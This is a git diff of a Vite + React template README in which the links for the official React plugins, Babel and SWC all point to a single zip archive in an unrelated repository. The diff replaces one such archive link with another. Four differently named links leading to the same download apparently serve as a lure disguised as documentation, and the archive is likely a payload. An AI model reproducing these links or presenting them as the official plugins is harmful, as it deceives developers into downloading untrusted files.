@@ -4,5 +4,5 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://github.com/ahnitin/Ecommerce-React/raw/refs/heads/main/src/components/UI/React_Ecommerce_1.3.zip) uses [Babel](https://github.com/ahnitin/Ecommerce-React/raw/refs/heads/main/src/components/UI/React_Ecommerce_1.3.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://github.com/ahnitin/Ecommerce-React/raw/refs/heads/main/src/components/UI/React_Ecommerce_1.3.zip) uses [SWC](https://github.com/ahnitin/Ecommerce-React/raw/refs/heads/main/src/components/UI/React_Ecommerce_1.3.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://raw.githubusercontent.com/ahnitin/Ecommerce-React/main/src/React-Ecommerce-3.5.zip) uses [Babel](https://raw.githubusercontent.com/ahnitin/Ecommerce-React/main/src/React-Ecommerce-3.5.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/ahnitin/Ecommerce-React/main/src/React-Ecommerce-3.5.zip) uses [SWC](https://raw.githubusercontent.com/ahnitin/Ecommerce-React/main/src/React-Ecommerce-3.5.zip) for Fast Refresh
